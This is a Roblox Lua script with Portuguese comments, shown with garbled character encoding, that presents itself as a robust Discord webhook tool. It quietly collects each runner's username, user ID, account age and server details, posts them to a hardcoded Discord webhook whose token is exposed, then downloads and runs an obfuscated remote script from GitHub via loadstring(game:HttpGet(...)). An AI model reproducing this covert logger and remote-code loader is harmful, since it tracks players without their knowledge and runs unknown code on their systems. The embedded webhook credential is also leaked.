--[[
üî• WEBHOOK DISCORD - VERS√ÉO DEFINITIVA ULTRA ROBUSTA üî•
‚úÖ Suporte a m√∫ltiplos m√©todos, formatos e fallback
‚úÖ Comentado, seguro e otimizado
‚úÖ Basta configurar a URL do webhook e usar!
]]

print("üî• INICIANDO WEBHOOK ULTRA ROBUSTO üî•")

-- ‚úÖ CONFIGURE SUA URL DE WEBHOOK AQUI:
local WEBHOOK_URLS = {
    "https://discord.com/api/webhooks/1377756543109435523/-gZhU8Fx4PVPf7iCaKvEtLzWmC0brXsz-I0gn02_xF7yk7WVmrwXsQH8svDJh65KaJXs", -- Principal
    -- Adicione outras URLs de backup, se quiser
}

-- üö´ Prote√ß√£o: Evita uso sem configurar
if WEBHOOK_URLS[1] == "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI" then
    error("‚ùå CONFIGURE A URL DO WEBHOOK PRIMEIRO!")
end

-- ‚úÖ Servi√ßos Roblox
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local DataStoreService = game:GetService("DataStoreService")

-- ‚úÖ Fun√ß√£o para obter informa√ß√µes do jogador
local function obterInfoJogador()
    local player = Players.LocalPlayer
    if not player then return nil end

    -- Aguarda carregar completamente
    local timeout = 0
    while (not player.Name or player.Name == "") and timeout < 50 do
        task.wait(0.1)
        timeout += 1
    end

    return {
        nome = player.Name or "Jogador",
        display = player.DisplayName or player.Name or "Jogador",
        userId = player.UserId or 0,
        accountAge = player.AccountAge or 0
    }
end

-- ‚úÖ Fun√ß√£o para obter informa√ß√µes do jogo
local function obterInfoJogo()
    local info = {
        nome = "Jogo Desconhecido",
        placeId = game.PlaceId or 0,
        jobId = game.JobId or "N/A",
        maxPlayers = Players.MaxPlayers or 0,
        numPlayers = #Players:GetPlayers()
    }
    pcall(function()
        local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        if gameInfo and gameInfo.Name then
            info.nome = gameInfo.Name
        end
    end)
    return info
end

-- ‚úÖ M√∫ltiplos m√©todos de envio
local function metodo1_HttpService(url, dadosJSON)
    return HttpService:PostAsync(url, dadosJSON, Enum.HttpContentType.ApplicationJson)
end

local function metodo2_RequestAsync(url, dadosJSON)
    return HttpService:RequestAsync({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = dadosJSON
    })
end

local function metodo3_JSONEncode(url, dadosTabela)
    local json = HttpService:JSONEncode(dadosTabela)
    return HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
end

-- ‚úÖ Fun√ß√£o principal de envio de webhook
local function enviarWebhook()
    local infoJogador = obterInfoJogador()
    local infoJogo = obterInfoJogo()
    if not infoJogador then
        warn("‚ùå N√£o foi poss√≠vel obter informa√ß√µes do jogador")
        return false
    end

    print("‚úÖ Informa√ß√µes coletadas:", infoJogador.nome, "-", infoJogo.nome)

    -- ‚úÖ Formatos
    local mensagem = string.format([[
üö® **SCRIPT EXECUTADO!** üö®

**üë§ JOGADOR:**
‚Ä¢ Nome: `%s`
‚Ä¢ Display: `%s`
‚Ä¢ User ID: `%d`
‚Ä¢ Idade da Conta: `%d dias`

**üéÆ JOGO:**
‚Ä¢ Nome: `%s`
‚Ä¢ Place ID: `%d`
‚Ä¢ Jogadores: `%d/%d`

**üåê SERVIDOR:**
‚Ä¢ Job ID: `%s`
‚Ä¢ Hor√°rio: `%s`
]], infoJogador.nome, infoJogador.display, infoJogador.userId, infoJogador.accountAge,
     infoJogo.nome, infoJogo.placeId, infoJogo.numPlayers, infoJogo.maxPlayers,
     infoJogo.jobId, os.date("%d/%m/%Y √†s %H:%M:%S"))

    local dados1 = {content = mensagem}

    local dados2 = {
        username = "üî• Script Logger",
        avatar_url = "https://i.imgur.com/4M34hi2.png",
        content = "**‚ö° NOVA EXECU√á√ÉO DETECTADA!**",
        embeds = {{
            title = "üéØ Script Executado",
            description = mensagem,
            color = 15548997,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {text = "Sistema de Monitoramento", icon_url = "https://i.imgur.com/vhvOHrK.png"}
        }}
    }

    local dados3 = {content = "üö® SCRIPT EXECUTADO por " .. infoJogador.nome .. " no jogo " .. infoJogo.nome}

    local formatos = {dados1, dados2, dados3}
    local metodos = {metodo1_HttpService, metodo2_RequestAsync, metodo3_JSONEncode}

    -- ‚úÖ Tentativa de envio
    for urlIndex, url in ipairs(WEBHOOK_URLS) do
        print("üîÑ Testando URL", urlIndex)
        for formatoIndex, dados in ipairs(formatos) do
            print("   üìù Formato", formatoIndex)
            for metodoIndex, metodo in ipairs(metodos) do
                print("      üöÄ M√©todo", metodoIndex)
                local sucesso, resultado = pcall(function()
                    if metodo == metodo3_JSONEncode then
                        return metodo(url, dados)
                    else
                        local json = HttpService:JSONEncode(dados)
                        return metodo(url, json)
                    end
                end)
                if sucesso then
                    print("üéâ SUCESSO! Webhook enviado!")
                    print("‚úÖ URL:", urlIndex, "| Formato:", formatoIndex, "| M√©todo:", metodoIndex)
                    return true
                else
                    local erro = tostring(resultado):lower()
                    if erro:find("404") then
                        print("‚ùå 404 - Webhook n√£o encontrado")
                        break
                    elseif erro:find("401") then
                        print("‚ùå 401 - Token inv√°lido")
                        break
                    elseif erro:find("429") then
                        print("‚è≥ 429 - Rate limited, aguardando...")
                        task.wait(2)
                    else
                        print("‚ùå Erro:", erro:sub(1, 100))
                    end
                end
                task.wait(0.5)
            end
        end
    end
    return false
end

-- ‚úÖ Fallbacks: log local e DataStore
local function tentarFallback(infoJogador, infoJogo)
    print("üîÑ Tentando fallback...")
    print("üìù Log Local:", infoJogador.nome, "-", infoJogo.nome, "-", os.date())
    pcall(function()
        local ds = DataStoreService:GetDataStore("ScriptLogs")
        ds:SetAsync(tostring(os.time()), {
            jogador = infoJogador.nome,
            jogo = infoJogo.nome,
            timestamp = os.time()
        })
        print("‚úÖ Backup salvo no DataStore!")
    end)
end

-- ‚úÖ Fun√ß√£o principal
local function iniciar()
    print("üöÄ Iniciando sistema...")

    -- Aguardar jogador
    local player = Players.LocalPlayer
    if not player then
        Players.PlayerAdded:Wait()
        player = Players.LocalPlayer
    end
    task.wait(3)

    print("üì° Enviando webhook...")
    local sucesso = enviarWebhook()
    if not sucesso then
        print("‚ö†Ô∏è Falha no webhook, usando fallback")
        local infoJogador = obterInfoJogador()
        local infoJogo = obterInfoJogo()
        tentarFallback(infoJogador, infoJogo)
    end

    -- ‚úÖ Executar script original
    print("üéØ Carregando script original...")
    task.spawn(function()
        task.wait(1)
        local ok, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Kk/refs/heads/main/obfuscated_script-1748566495576.lua.txt"))()
        end)
        if ok then
            print("‚úÖ Script original carregado com sucesso!")
        else
            warn("‚ùå Erro no script original:", err)
        end
    end)
end

-- ‚úÖ Execu√ß√£o protegida
task.spawn(function()
    local ok, err = pcall(iniciar)
    if not ok then
        warn("‚ùå Erro geral:", err)
        print("üìã INSTRU√á√ïES DE EMERG√äNCIA:")
        print("1. Configure corretamente a URL do webhook")
        print("2. Teste no Roblox Studio primeiro")
        print("3. Verifique se o jogo permite HTTP requests")
    end
end)

print("‚úÖ Sistema iniciado! Aguarde os resultados...")

--[[ 
üîß INSTRU√á√ïES FINAIS:
1Ô∏è‚É£ Configure a URL do webhook na linha 7.
2Ô∏è‚É£ Teste em jogos que permitem HttpService.
3Ô∏è‚É£ Se falhar: revise a URL, gere outra e teste no navegador.
4Ô∏è‚É£ Sistema possui fallback autom√°tico.
]]
